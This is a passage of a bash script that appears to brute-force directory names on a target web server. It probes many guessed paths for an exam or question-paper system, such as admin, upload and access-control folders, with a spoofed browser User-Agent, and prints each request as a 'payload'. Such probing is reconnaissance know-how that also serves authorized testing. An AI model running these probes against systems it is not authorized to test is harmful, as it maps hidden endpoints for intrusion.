payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperDataUpload/"]: "
